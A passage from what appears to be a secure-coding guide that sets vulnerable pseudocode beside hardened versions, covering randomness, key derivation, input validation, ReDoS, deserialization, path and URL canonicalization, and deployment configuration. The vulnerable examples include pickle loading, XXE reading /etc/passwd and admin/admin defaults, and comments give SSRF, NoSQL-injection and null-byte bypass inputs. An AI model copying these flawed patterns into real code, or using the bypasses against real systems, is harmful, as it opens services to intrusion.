    RETURN key
END FUNCTION

// Problems:
// - Math.random(): Uses predictable PRNG (Mersenne Twister)
// - Time seed: Attacker can guess seed from approximate time
// - Internal state: Can be recovered from ~624 outputs

// ========================================
// GOOD: Cryptographically secure randomness
// ========================================
FUNCTION generate_session_id_secure():
    // Use cryptographically secure random
    RETURN secrets.token_urlsafe(32)  // 256 bits of entropy
END FUNCTION

FUNCTION generate_token_secure():
    // Use secrets module (Python) or crypto.randomBytes (Node)
    RETURN secrets.token_hex(32)  // 256 bits as hex string
END FUNCTION

FUNCTION generate_key_secure():
    // Use OS entropy source
    RETURN os.urandom(32)  // 256 bits from /dev/urandom or equivalent
END FUNCTION

FUNCTION generate_password_secure(length):
    // Secure password generation
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
    password = ""
    FOR i = 0 TO length - 1:
        password += alphabet[secrets.randbelow(alphabet.length)]
    END FOR
    RETURN password
END FUNCTION

// Language-specific secure random:
// Python: secrets module, os.urandom
// Node.js: crypto.randomBytes, crypto.randomUUID
// Java: SecureRandom
// Go: crypto/rand
// Ruby: SecureRandom
// PHP: random_bytes, random_int
```

### 5.7 Improper Key Derivation

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Weak key derivation methods
// ========================================
FUNCTION derive_key_weak(password):
    // Vulnerable: Direct hash of password
    RETURN sha256(password)
END FUNCTION

FUNCTION derive_key_truncated(password):
    // Vulnerable: Password truncation
    RETURN password.bytes()[0:32]  // Loses entropy!
END FUNCTION

FUNCTION derive_key_md5(password, salt):
    // Vulnerable: MD5 with low iteration count
    RETURN md5(salt + password)
END FUNCTION

FUNCTION derive_key_fast(password, salt):
    // Vulnerable: Single SHA iteration (too fast to brute-force resist)
    RETURN sha256(salt + password)
END FUNCTION

// Problems:
// - Direct hash: No salt, no iterations, vulnerable to rainbow tables
// - Truncation: Reduces entropy, predictable patterns
// - Fast hash: GPU can compute billions per second

// ========================================
// GOOD: Proper key derivation functions
// ========================================
FUNCTION derive_key_pbkdf2(password, salt):
    // PBKDF2 with high iteration count
    IF salt IS NULL:
        salt = crypto.secure_random_bytes(32)
    END IF

    key = pbkdf2_hmac(
        hash_name="sha256",
        password=password.encode(),
        salt=salt,
        iterations=600000,  // OWASP recommends 600,000+ for SHA-256
        key_length=32
    )
    RETURN {key: key, salt: salt}
END FUNCTION

FUNCTION derive_key_argon2(password, salt):
    // Argon2id - memory-hard, recommended for passwords
    IF salt IS NULL:
        salt = crypto.secure_random_bytes(16)
    END IF

    key = argon2id.hash(
        password=password,
        salt=salt,
        time_cost=3,         // Iterations
        memory_cost=65536,   // 64MB memory
        parallelism=4,       // 4 threads
        hash_len=32          // Output length
    )
    RETURN {key: key, salt: salt}
END FUNCTION

FUNCTION derive_key_scrypt(password, salt):
    // scrypt - memory-hard alternative
    IF salt IS NULL:
        salt = crypto.secure_random_bytes(32)
    END IF

    key = scrypt(
        password=password.encode(),
        salt=salt,
        n=2^17,       // CPU/memory cost (131072)
        r=8,          // Block size
        p=1,          // Parallelism
        key_length=32
    )
    RETURN {key: key, salt: salt}
END FUNCTION

// For deriving multiple keys from one password
FUNCTION derive_multiple_keys(password, salt):
    // Use HKDF to derive multiple keys from master key
    master_key = derive_key_argon2(password, salt).key

    encryption_key = hkdf_expand(
        master_key,
        info="encryption",
        length=32
    )

    mac_key = hkdf_expand(
        master_key,
        info="mac",
        length=32
    )

    RETURN {
        encryption_key: encryption_key,
        mac_key: mac_key
    }
END FUNCTION
```

---

## 6. Input Validation

**CWE References:** CWE-20 (Improper Input Validation), CWE-1284 (Improper Validation of Specified Quantity in Input), CWE-1333 (Inefficient Regular Expression Complexity), CWE-22 (Path Traversal), CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize)
**Severity:** High | **Related:** [[Input-Validation]]

> **Risk:** Input validation failures are a foundational vulnerability enabling most other attack classes. AI-generated code frequently relies solely on client-side validation (trivially bypassed) or omits validation entirely. Missing length limits enable DoS attacks, improper type checking allows type confusion attacks, and ReDoS patterns can freeze services. All user input must be validated on the server with type, length, format, and range constraints.

### 6.1 Missing Server-Side Validation (Client-Only)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Client-side only validation
// ========================================
// Frontend JavaScript
FUNCTION validate_form_client_only():
    email = document.getElementById("email").value
    age = document.getElementById("age").value

    IF NOT email.includes("@"):
        show_error("Invalid email")
        RETURN FALSE
    END IF

    IF age < 0 OR age > 150:
        show_error("Invalid age")
        RETURN FALSE
    END IF

    // Form submits if client-side validation passes
    form.submit()
END FUNCTION

// Backend - NO validation!
FUNCTION create_user(request):
    // Vulnerable: Trusts client-side validation completely
    email = request.body.email
    age = request.body.age

    database.insert("users", {email: email, age: age})
    RETURN {success: TRUE}
END FUNCTION

// Attack: Attacker bypasses JavaScript with direct HTTP request
// curl -X POST /api/users -d '{"email":"not-an-email","age":-999}'
// Result: Invalid data stored in database

// ========================================
// GOOD: Server-side validation (client-side is UX only)
// ========================================
// Backend - validates everything
FUNCTION create_user(request):
    // Validate all input server-side
    validation_errors = []

    // Email validation
    email = request.body.email
    IF typeof(email) != "string":
        validation_errors.append("Email must be a string")
    ELSE IF NOT regex.match("^[^@]+@[^@]+\.[^@]+$", email):
        validation_errors.append("Invalid email format")
    ELSE IF email.length > 254:
        validation_errors.append("Email too long")
    END IF

    // Age validation
    age = request.body.age
    IF typeof(age) != "number" OR NOT is_integer(age):
        validation_errors.append("Age must be an integer")
    ELSE IF age < 0 OR age > 150:
        validation_errors.append("Age must be between 0 and 150")
    END IF

    IF validation_errors.length > 0:
        RETURN {success: FALSE, errors: validation_errors}
    END IF

    // Safe to process validated data
    database.insert("users", {email: email, age: age})
    RETURN {success: TRUE}
END FUNCTION

// Client-side validation is still useful for UX (immediate feedback)
// but NEVER rely on it for security
```

### 6.2 Improper Type Checking

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Missing or weak type validation
// ========================================
FUNCTION process_payment_weak(request):
    amount = request.body.amount
    quantity = request.body.quantity

    // Vulnerable: No type checking
    total = amount * quantity

    // What if amount = "100" (string)? JavaScript: "100" * 2 = 200 (coerced)
    // What if amount = [100]? Some languages coerce arrays unexpectedly
    // What if quantity = {"$gt": 0}? NoSQL injection possible

    charge_card(user, total)
END FUNCTION

FUNCTION get_user_weak(request):
    user_id = request.params.id

    // Vulnerable: ID could be array, object, or unexpected type
    // MongoDB: ?id[$ne]=null returns all users!
    RETURN database.find_one({id: user_id})
END FUNCTION

FUNCTION calculate_discount_weak(price, discount_percent):
    // Vulnerable: No validation of numeric types
    // discount_percent = "50" → string concatenation in some languages
    // discount_percent = NaN → NaN propagates through calculations
    final_price = price - (price * discount_percent / 100)
    RETURN final_price
END FUNCTION

// ========================================
// GOOD: Strict type validation
// ========================================
FUNCTION process_payment_safe(request):
    // Validate amount
    amount = request.body.amount
    IF typeof(amount) != "number":
        THROW ValidationError("Amount must be a number")
    END IF
    IF NOT is_finite(amount) OR is_nan(amount):
        THROW ValidationError("Amount must be a valid number")
    END IF
    IF amount <= 0:
        THROW ValidationError("Amount must be positive")
    END IF

    // Validate quantity
    quantity = request.body.quantity
    IF typeof(quantity) != "number" OR NOT is_integer(quantity):
        THROW ValidationError("Quantity must be an integer")
    END IF
    IF quantity <= 0 OR quantity > 1000:
        THROW ValidationError("Quantity must be between 1 and 1000")
    END IF

    // Safe to calculate
    total = amount * quantity

    // Additional: Prevent floating point issues with currency
    total_cents = round(total * 100)  // Work in cents
    charge_card(user, total_cents)
END FUNCTION

FUNCTION get_user_safe(request):
    user_id = request.params.id

    // Strict type checking
    IF typeof(user_id) != "string":
        THROW ValidationError("User ID must be a string")
    END IF

    // Format validation (e.g., UUID)
    IF NOT is_valid_uuid(user_id):
        THROW ValidationError("Invalid user ID format")
    END IF

    RETURN database.find_one({id: user_id})
END FUNCTION

// Type coercion helper with explicit validation
FUNCTION parse_integer_strict(value, min, max):
    IF typeof(value) == "number":
        IF NOT is_integer(value):
            THROW ValidationError("Expected integer, got float")
        END IF
        result = value
    ELSE IF typeof(value) == "string":
        IF NOT regex.match("^-?[0-9]+$", value):
            THROW ValidationError("Invalid integer format")
        END IF
        result = parse_int(value)
    ELSE:
        THROW ValidationError("Expected number or numeric string")
    END IF

    IF result < min OR result > max:
        THROW ValidationError("Value out of range: " + min + " to " + max)
    END IF

    RETURN result
END FUNCTION
```

### 6.3 Missing Length Limits

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: No length limits on input
// ========================================
FUNCTION create_post_unlimited(request):
    title = request.body.title
    content = request.body.content

    // Vulnerable: No length limits
    // Attacker sends 1GB title, exhausts memory/storage
    database.insert("posts", {title: title, content: content})
END FUNCTION

FUNCTION search_unlimited(request):
    query = request.params.q

    // Vulnerable: Long query strings can DoS search systems
    // Also enables ReDoS if query is used in regex
    results = database.search(query)
    RETURN results
END FUNCTION

FUNCTION process_file_unlimited(request):
    file_content = request.body.file

    // Vulnerable: No file size limit
    // Attacker uploads 10GB file, exhausts disk/memory
    save_file(file_content)
END FUNCTION

// Real-world DoS: JSON payload with deeply nested objects
// {"a":{"a":{"a":{"a":...}}}}  // 1000 levels deep
// Can crash parsers or exhaust stack space

// ========================================
// GOOD: Enforce length limits on all inputs
// ========================================
CONSTANT MAX_TITLE_LENGTH = 200
CONSTANT MAX_CONTENT_LENGTH = 50000
CONSTANT MAX_SEARCH_QUERY = 500
CONSTANT MAX_FILE_SIZE = 10 * 1024 * 1024  // 10MB
CONSTANT MAX_JSON_DEPTH = 20

FUNCTION create_post_limited(request):
    title = request.body.title
    content = request.body.content

    // Validate title length
    IF typeof(title) != "string":
        THROW ValidationError("Title must be a string")
    END IF
    IF title.length == 0:
        THROW ValidationError("Title is required")
    END IF
    IF title.length > MAX_TITLE_LENGTH:
        THROW ValidationError("Title exceeds " + MAX_TITLE_LENGTH + " characters")
    END IF

    // Validate content length
    IF typeof(content) != "string":
        THROW ValidationError("Content must be a string")
    END IF
    IF content.length > MAX_CONTENT_LENGTH:
        THROW ValidationError("Content exceeds " + MAX_CONTENT_LENGTH + " characters")
    END IF

    database.insert("posts", {title: title, content: content})
END FUNCTION

FUNCTION search_limited(request):
    query = request.params.q

    IF typeof(query) != "string":
        THROW ValidationError("Query must be a string")
    END IF
    IF query.length > MAX_SEARCH_QUERY:
        THROW ValidationError("Search query too long")
    END IF
    IF query.length < 2:
        THROW ValidationError("Search query too short")
    END IF

    results = database.search(query)
    RETURN results
END FUNCTION

// Configure request body limits at framework level
FUNCTION configure_server():
    server.set_body_limit(MAX_FILE_SIZE)
    server.set_json_depth_limit(MAX_JSON_DEPTH)
    server.set_parameter_limit(1000)  // Max form fields
    server.set_header_size_limit(8192)  // 8KB header limit
END FUNCTION

// Array length limits
FUNCTION process_batch_request(request):
    items = request.body.items

    IF NOT is_array(items):
        THROW ValidationError("Items must be an array")
    END IF
    IF items.length > 100:
        THROW ValidationError("Maximum 100 items per batch")
    END IF

    FOR item IN items:
        process_single_item(item)
    END FOR
END FUNCTION
```

### 6.4 Regex Denial of Service (ReDoS)

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Vulnerable regex patterns
// ========================================
FUNCTION validate_email_redos(email):
    // Vulnerable: Catastrophic backtracking on malformed input
    // Pattern with nested quantifiers
    pattern = "^([a-zA-Z0-9]+)+@[a-zA-Z0-9]+\.[a-zA-Z]+$"

    // Attack input: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
    // Regex engine tries exponential combinations before failing
    RETURN regex.match(pattern, email)
END FUNCTION

FUNCTION validate_url_redos(url):
    // Vulnerable: Multiple overlapping groups
    pattern = "^(https?://)?(www\.)?([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(/.*)*$"

    // Attack input: "http://aaaaaaaaaaaaaaaaaaaaaaaa"
    RETURN regex.match(pattern, url)
END FUNCTION

FUNCTION search_with_regex(user_pattern, content):
    // Vulnerable: User-controlled regex pattern
    // Attacker provides: "(a+)+$" with input "aaaaaaaaaaaaaaaaaaaX"
    RETURN regex.search(user_pattern, content)
END FUNCTION

// ReDoS patterns to avoid:
// - Nested quantifiers: (a+)+, (a*)*
// - Overlapping alternatives: (a|a)+, (a|ab)+
// - Quantified groups with repetition: (a+b+)+

// ========================================
// GOOD: Safe regex patterns and practices
// ========================================
FUNCTION validate_email_safe(email):
    // First: Length check before regex
    IF email.length > 254:
        RETURN FALSE
    END IF

    // Use atomic groups or possessive quantifiers if available
    // Or use simpler, non-backtracking patterns
    pattern = "^[^@\s]+@[^@\s]+\.[^@\s]+$"  // Simple, no backtracking risk

    RETURN regex.match(pattern, email)
END FUNCTION

FUNCTION validate_email_best(email):
    // Best: Use a validated library
    TRY:
        validated = email_validator.validate(email)
        RETURN TRUE
    CATCH ValidationError:
        RETURN FALSE
    END TRY
END FUNCTION

FUNCTION validate_url_safe(url):
    // Length limit first
    IF url.length > 2048:
        RETURN FALSE
    END IF

    // Use URL parser instead of regex
    TRY:
        parsed = url_parser.parse(url)
        RETURN parsed.host IS NOT NULL AND parsed.protocol IN ["http:", "https:"]
    CATCH ParseError:
        RETURN FALSE
    END TRY
END FUNCTION

FUNCTION search_with_safe_pattern(user_input, content):
    // Never use user input directly as regex
    // Escape special characters if literal match needed
    escaped_input = regex.escape(user_input)

    // Set timeout on regex operations
    RETURN regex.search(escaped_input, content, timeout=1000)  // 1 second max
END FUNCTION

// Use RE2 or similar guaranteed-linear-time regex engine
FUNCTION search_with_re2(pattern, content):
    // RE2 rejects patterns that could cause exponential backtracking
    TRY:
        compiled = re2.compile(pattern)
        RETURN compiled.search(content)
    CATCH UnsupportedPatternError:
        // Pattern rejected due to backtracking risk
        THROW ValidationError("Invalid search pattern")
    END TRY
END FUNCTION

// Safe pattern testing
FUNCTION is_safe_regex(pattern):
    // Detect common ReDoS patterns
    dangerous_patterns = [
        "\\(.+\\)+\\+",    // (x+)+
        "\\(.+\\)\\*\\+",  // (x*)+
        "\\(.+\\)+\\*",    // (x+)*
        "\\(.+\\|.+\\)+"   // (a|b)+
    ]

    FOR dangerous IN dangerous_patterns:
        IF regex.search(dangerous, pattern):
            RETURN FALSE
        END IF
    END FOR

    RETURN TRUE
END FUNCTION
```

### 6.5 Accepting and Processing Untrusted Data

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Trusting external data sources
// ========================================
FUNCTION process_webhook_unsafe(request):
    // Vulnerable: No signature verification
    data = json.parse(request.body)

    // Attacker can spoof webhook requests
    IF data.event == "payment_completed":
        mark_order_paid(data.order_id)  // Dangerous!
    END IF
END FUNCTION

FUNCTION fetch_and_process_unsafe(url):
    // Vulnerable: Processing arbitrary external content
    response = http.get(url)
    data = json.parse(response.body)

    // No validation of response structure
    database.insert("external_data", data)
END FUNCTION

FUNCTION deserialize_unsafe(serialized_data):
    // Vulnerable: Pickle/eval deserialization of untrusted data
    // Allows arbitrary code execution!
    object = pickle.loads(serialized_data)
    RETURN object
END FUNCTION

FUNCTION process_xml_unsafe(xml_string):
    // Vulnerable: XXE (XML External Entity) attack
    parser = xml.create_parser()
    doc = parser.parse(xml_string)
    // Attacker XML: <!ENTITY xxe SYSTEM "file:///etc/passwd">
    RETURN doc
END FUNCTION

// ========================================
// GOOD: Validate and sanitize external data
// ========================================
FUNCTION process_webhook_safe(request):
    // Verify webhook signature
    signature = request.headers.get("X-Signature")
    expected = hmac_sha256(WEBHOOK_SECRET, request.raw_body)

    IF NOT constant_time_compare(signature, expected):
        log.warning("Invalid webhook signature", {ip: request.ip})
        RETURN {status: 401, error: "Invalid signature"}
    END IF

    // Validate payload structure
    data = json.parse(request.body)

    IF NOT validate_webhook_schema(data):
        RETURN {status: 400, error: "Invalid payload"}
    END IF

    // Process verified and validated data
    IF data.event == "payment_completed":
        // Additional verification: Check with payment provider
        IF verify_payment_with_provider(data.payment_id):
            mark_order_paid(data.order_id)
        END IF
    END IF
END FUNCTION

FUNCTION fetch_and_process_safe(url):
    // Validate URL is from allowed sources
    parsed_url = url_parser.parse(url)
    IF parsed_url.host NOT IN ALLOWED_HOSTS:
        THROW ValidationError("URL host not allowed")
    END IF

    // Fetch with timeout and size limits
    response = http.get(url, timeout=10, max_size=1024*1024)

    // Parse and validate structure
    TRY:
        data = json.parse(response.body)
    CATCH JSONError:
        THROW ValidationError("Invalid JSON response")
    END TRY

    // Validate against expected schema
    validated_data = validate_schema(data, EXPECTED_SCHEMA)

    // Sanitize before storing
    sanitized = sanitize_object(validated_data)
    database.insert("external_data", sanitized)
END FUNCTION

FUNCTION deserialize_safe(data, format):
    // Never use pickle/eval for untrusted data
    // Use safe serialization formats
    IF format == "json":
        RETURN json.parse(data)
    ELSE IF format == "msgpack":
        RETURN msgpack.unpack(data)
    ELSE:
        THROW Error("Unsupported format")
    END IF
END FUNCTION

FUNCTION process_xml_safe(xml_string):
    // Disable external entities and DTDs
    parser = xml.create_parser(
        resolve_entities=FALSE,
        load_dtd=FALSE,
        no_network=TRUE
    )

    TRY:
        doc = parser.parse(xml_string)
        RETURN doc
    CATCH XMLError as e:
        log.warning("XML parsing failed", {error: e.message})
        THROW ValidationError("Invalid XML")
    END TRY
END FUNCTION

// Schema validation helper
FUNCTION validate_schema(data, schema):
    // Use JSON Schema or similar validation library
    validator = JsonSchemaValidator(schema)

    IF NOT validator.is_valid(data):
        errors = validator.get_errors()
        THROW ValidationError("Schema validation failed: " + errors.join(", "))
    END IF

    RETURN data
END FUNCTION
```

### 6.6 Missing Canonicalization

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Validation without canonicalization
// ========================================
FUNCTION check_path_unsafe(requested_path):
    // Vulnerable: Path not canonicalized before validation
    IF requested_path.starts_with("/uploads/"):
        // Bypass: "../../../etc/passwd" doesn't start with /uploads/
        // But resolves to outside the directory!
        RETURN read_file(requested_path)
    END IF
    THROW AccessDenied("Invalid path")
END FUNCTION

FUNCTION check_url_unsafe(url):
    // Vulnerable: URL manipulation bypasses check
    // Blocked: "http://internal-server"
    // Bypass: "http://internal-server%00.example.com"
    // Bypass: "http://0x7f000001" (127.0.0.1 in hex)
    // Bypass: "http://localhost" vs "http://LOCALHOST" vs "http://127.0.0.1"

    IF url.contains("internal-server"):
        THROW AccessDenied("Internal URLs not allowed")
    END IF

    RETURN http.get(url)
END FUNCTION

FUNCTION validate_filename_unsafe(filename):
    // Vulnerable: Unicode normalization bypass
    // Blocked: "config.php"
    // Bypass: "config.php" with full-width characters (ｃｏｎｆｉｇ.php)
    // Bypass: "config.php\x00.txt" (null byte injection)

    IF filename.ends_with(".php"):
        THROW AccessDenied("PHP files not allowed")
    END IF

    save_file(filename)
END FUNCTION

FUNCTION check_html_unsafe(content):
    // Vulnerable: Case-sensitive blacklist
    // Blocked: "<script>"
    // Bypass: "<SCRIPT>", "<ScRiPt>", "<script ", etc.

    IF content.contains("<script>"):
        THROW AccessDenied("Scripts not allowed")
    END IF

    RETURN content
END FUNCTION

// ========================================
// GOOD: Canonicalize before validation
// ========================================
FUNCTION check_path_safe(requested_path):
    // Canonicalize path first
    base_path = path.resolve("/uploads")
    canonical_path = path.resolve(requested_path)

    // Verify canonical path is within allowed directory
    IF NOT canonical_path.starts_with(base_path):
        log.warning("Path traversal attempt", {
            requested: requested_path,
            resolved: canonical_path
        })
        THROW AccessDenied("Invalid path")
    END IF

    // Additional: Verify path doesn't contain null bytes
    IF requested_path.contains("\x00"):
        THROW AccessDenied("Invalid path characters")
    END IF

    RETURN read_file(canonical_path)
END FUNCTION

FUNCTION check_url_safe(url):
    // Parse and canonicalize URL
    TRY:
        parsed = url_parser.parse(url)
    CATCH ParseError:
        THROW AccessDenied("Invalid URL")
    END TRY

    // Normalize hostname
    host = parsed.hostname.lower()

    // Resolve to IP to catch obfuscation
    TRY:
        resolved_ip = dns.resolve(host)
    CATCH DNSError:
        THROW AccessDenied("Cannot resolve host")
    END TRY

    // Check against blocked IP ranges
    blocked_ranges = [
        "127.0.0.0/8",     // Localhost
        "10.0.0.0/8",      // Private
        "172.16.0.0/12",   // Private
        "192.168.0.0/16",  // Private
        "169.254.0.0/16"   // Link-local
    ]

    FOR range IN blocked_ranges:
        IF ip_in_range(resolved_ip, range):
            THROW AccessDenied("Internal addresses not allowed")
        END IF
    END FOR

    // Additional: Block by resolved hostname
    IF host IN BLOCKED_HOSTS:
        THROW AccessDenied("Host not allowed")
    END IF

    RETURN http.get(url)
END FUNCTION

FUNCTION validate_filename_safe(filename):
    // Remove null bytes
    clean_name = filename.replace("\x00", "")

    // Normalize Unicode (NFC form)
    normalized = unicode_normalize("NFC", clean_name)

    // Convert to ASCII-safe representation
    ascii_name = transliterate_to_ascii(normalized)

    // Extract actual extension (after normalization)
    extension = path.get_extension(ascii_name).lower()

    // Whitelist allowed extensions
    allowed_extensions = [".jpg", ".png", ".gif", ".pdf", ".txt"]
    IF extension NOT IN allowed_extensions:
        THROW AccessDenied("File type not allowed: " + extension)
    END IF

    // Generate safe filename
    safe_name = uuid() + extension
    save_file(safe_name)
END FUNCTION

FUNCTION sanitize_html_safe(content):
    // Case-insensitive checking
    lower_content = content.lower()

    // Better: Use HTML parser and whitelist approach
    parsed = html_parser.parse(content)

    // Remove all script elements regardless of case
    FOR element IN parsed.find_all("script"):
        element.remove()
    END FOR

    // Remove event handlers
    FOR element IN parsed.find_all():
        FOR attr IN element.attributes:
            IF attr.name.lower().starts_with("on"):
                element.remove_attribute(attr.name)
            END IF
        END FOR
    END FOR

    // Best: Use a sanitization library like DOMPurify
    RETURN DOMPurify.sanitize(content)
END FUNCTION

// Canonicalization order matters:
// 1. Decode (URL decode, Unicode normalize)
// 2. Canonicalize (resolve paths, lowercase hostnames)
// 3. Validate (check against rules)
// 4. Encode for output context (HTML encode, URL encode)
```

---

## 7. Configuration and Deployment

**CWE References:** CWE-215 (Information Exposure Through Debug Information), CWE-209 (Error Message Exposure), CWE-16 (Configuration), CWE-346 (Origin Validation Error), CWE-1188 (Insecure Default Initialization)
**Severity:** High | **Related:** [[Configuration-Issues]]

> **Risk:** Misconfigured deployments expose sensitive information, enable attacks, and provide attackers with detailed system internals. Debug modes, verbose errors, and default credentials are among the most common causes of data breaches. AI-generated code often includes development-only settings unsuitable for production.

### 7.1 Debug Mode in Production

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Debug mode enabled in production
// ========================================

// Mistake 1: Hardcoded debug flag
CONSTANT DEBUG = TRUE  // Never changes between environments

FUNCTION start_application():
    app.config.debug = TRUE
    app.config.show_stack_traces = TRUE
    app.config.enable_profiler = TRUE

    // Exposes: full stack traces, variable values, file paths, database queries
    app.run()
END FUNCTION

// Mistake 2: Debug routes left enabled
app.route("/debug/env", show_environment_variables)
app.route("/debug/config", show_all_config)
app.route("/debug/sql", run_arbitrary_sql)  // Catastrophic!

// Mistake 3: Development tools in production bundle
// package.json or requirements with dev dependencies in production
// React DevTools, Vue DevTools, Django Debug Toolbar exposed

// ========================================
// GOOD: Environment-based configuration
// ========================================

FUNCTION start_application():
    environment = get_environment_variable("APP_ENV", "production")

    IF environment == "production":
        app.config.debug = FALSE
        app.config.show_stack_traces = FALSE
        app.config.enable_profiler = FALSE

        // Ensure debug routes are not registered
        disable_debug_routes()

    ELSE IF environment == "development":
        // Only enable debug in development
        app.config.debug = TRUE
        register_debug_routes()
    END IF

    app.run()
END FUNCTION

FUNCTION disable_debug_routes():
    // Explicitly remove or disable debug endpoints
    // Better: Don't register them in production at all

    debug_routes = ["/debug/*", "/test/*", "/__debug__/*", "/profiler/*"]
    FOR route IN debug_routes:
        app.remove_route(route)
    END FOR
END FUNCTION

// Build process should exclude dev dependencies
// package.json: use --production flag
// requirements.txt: separate dev-requirements.txt
// Dockerfile: multi-stage build without dev tools
```

### 7.2 Verbose Error Messages Exposing Internals

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Detailed errors exposed to users
// ========================================

FUNCTION handle_request(request):
    TRY:
        result = process_request(request)
        RETURN success_response(result)

    CATCH DatabaseError as e:
        // Exposes: database type, table names, query structure
        RETURN error_response("Database error: " + e.full_message)

    CATCH FileNotFoundError as e:
        // Exposes: full file system path, reveals server structure
        RETURN error_response("File not found: " + e.path)

    CATCH Exception as e:
        // Exposes: full stack trace with file paths, line numbers, code snippets
        RETURN error_response(e.stack_trace)
    END TRY
END FUNCTION

// Mistake: SQL error messages in API responses
FUNCTION get_user(user_id):
    TRY:
        RETURN database.query("SELECT * FROM users WHERE id = ?", [user_id])
    CATCH SQLException as e:
        // Attacker learns: MySQL 8.0.35, table 'users', column names
        RETURN {"error": "MySQL Error 1054: Unknown column 'passwrd' in 'users'"}
    END TRY
END FUNCTION

// ========================================
// GOOD: Generic external errors, detailed internal logging
// ========================================

FUNCTION handle_request(request):
    request_id = generate_request_id()

    TRY:
        result = process_request(request)
        RETURN success_response(result)

    CATCH DatabaseError as e:
        // Log full details internally with request ID for debugging
        log.error("Database error", {
            request_id: request_id,
            error: e.full_message,
            query: e.query,
            stack: e.stack_trace
        })

        // Return generic message with reference ID
        RETURN error_response({
            message: "A database error occurred",
            reference_id: request_id,
            status: 500
        })

    CATCH ValidationError as e:
        // Validation errors can be specific (user input related)
        RETURN error_response({
            message: e.user_message,  // Pre-sanitized user-facing message
            field: e.field,
            status: 400
        })

    CATCH AuthenticationError as e:
        // Never reveal which part failed (user vs password)
        log.warning("Auth failure", {request_id: request_id, reason: e.reason})

        RETURN error_response({
            message: "Invalid credentials",
            status: 401
        })

    CATCH Exception as e:
        // Catch-all for unexpected errors
        log.error("Unexpected error", {
            request_id: request_id,
            type: e.type,
            message: e.message,
            stack: e.stack_trace
        })

        RETURN error_response({
            message: "An unexpected error occurred",
            reference_id: request_id,
            status: 500
        })
    END TRY
END FUNCTION

// Configure error handling at application level
FUNCTION configure_error_handling():
    IF environment == "production":
        // Disable automatic stack trace exposure
        app.config.propagate_exceptions = FALSE
        app.config.show_exception_details = FALSE

        // Custom error pages without technical details
        app.set_error_handler(404, generic_not_found_page)
        app.set_error_handler(500, generic_error_page)
    END IF
END FUNCTION
```

### 7.3 Default Credentials

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Default credentials in code or config
// ========================================

// Mistake 1: Hardcoded default admin account
FUNCTION initialize_database():
    IF NOT user_exists("admin"):
        create_user({
            username: "admin",
            password: "admin",      // First thing attackers try
            role: "administrator"
        })
    END IF
END FUNCTION

// Mistake 2: Default passwords in configuration
config = {
    database: {
        host: "localhost",
        user: "root",
        password: "root"           // Default MySQL credentials
    },
    redis: {
        password: ""               // No password = open to network
    },
    admin_panel: {
        secret_key: "change_me"    // Never changed
    }
}

// Mistake 3: API keys with placeholder values
CONSTANT API_KEY = "YOUR_API_KEY_HERE"  // Developers forget to change
CONSTANT WEBHOOK_SECRET = "test123"

// ========================================
// GOOD: Require explicit configuration, no defaults
// ========================================

FUNCTION initialize_application():
    // Require all sensitive config to be explicitly set
    required_config = [
        "DATABASE_PASSWORD",
        "REDIS_PASSWORD",
        "SECRET_KEY",
        "API_KEY"
    ]

    FOR config_name IN required_config:
        value = get_environment_variable(config_name)

        IF value IS NULL OR value == "":
            THROW ConfigurationError(
                config_name + " must be set in environment"
            )
        END IF

        // Check for common placeholder values
        placeholder_patterns = ["change_me", "your_", "test", "example", "xxx"]
        FOR pattern IN placeholder_patterns:
            IF value.lower().contains(pattern):
                THROW ConfigurationError(
                    config_name + " appears to contain a placeholder value"
                )
            END IF
        END FOR
    END FOR
END FUNCTION

FUNCTION initialize_database():
    // Never create default admin accounts automatically
    // Instead, require explicit admin creation with strong password

    IF NOT admin_exists():
        IF environment == "development":
            log.warning("No admin account exists. Run: create_admin_account command")
        ELSE:
            log.error("No admin account configured for production")
            THROW ConfigurationError("Admin account must be created before deployment")
        END IF
    END IF
END FUNCTION

// First-run setup requires strong credentials
FUNCTION create_initial_admin(username, password):
    // Validate password strength
    IF NOT is_strong_password(password):
        THROW ValidationError("Admin password must meet complexity requirements")
    END IF

    // Hash password properly
    hashed = bcrypt.hash(password, rounds=12)

    create_user({
        username: username,
        password_hash: hashed,
        role: "administrator",
        requires_password_change: TRUE  // Force change on first login
    })
END FUNCTION

// Service accounts should use key-based auth, not passwords
FUNCTION configure_service_connections():
    // Use certificate-based auth for databases where possible
    database.connect({
        ssl_cert: load_file(env.get("DB_CLIENT_CERT")),
        ssl_key: load_file(env.get("DB_CLIENT_KEY")),
        ssl_ca: load_file(env.get("DB_CA_CERT"))
    })
END FUNCTION
```

### 7.4 Insecure CORS Configuration

```
// PSEUDOCODE - Implement in your target language

// ========================================
// BAD: Overly permissive CORS settings
// ========================================

// Mistake 1: Allow all origins
app.use_cors({
    origin: "*",                    // Any website can make requests!
    credentials: TRUE               // With user cookies!
})

// Mistake 2: Reflecting Origin header (same as allowing all)
FUNCTION handle_preflight(request):
    origin = request.get_header("Origin")

    response.set_header("Access-Control-Allow-Origin", origin)  // Reflects any origin
    response.set_header("Access-Control-Allow-Credentials", "true")
    RETURN response
END FUNCTION

// Mistake 3: Regex that's too broad
allowed_origin_pattern = /.*\.example\.com$/  // Matches evil-example.com too!
allowed_origin_pattern = /example\.com/        // Matches example.com.evil.com

// Mistake 4: Null origin allowed
IF origin == "null" OR origin IN allowed_origins:
    // "null" origin used by local files, data: URIs - exploitable!
    allow_cors(origin)
END IF

// ========================================
// GOOD: Strict origin allowlist
// ========================================

CONSTANT ALLOWED_ORIGINS = [
    "https://www.example.com",
    "https://app.example.com",
    "https://admin.example.com"
]

// Add development origins only in dev environment
FUNCTION get_allowed_origins():
    origins = ALLOWED_ORIGINS.copy()

    IF environment == "development":
        origins.append("http://localhost:3000")
        origins.append("http://127.0.0.1:3000")
    END IF

    RETURN origins
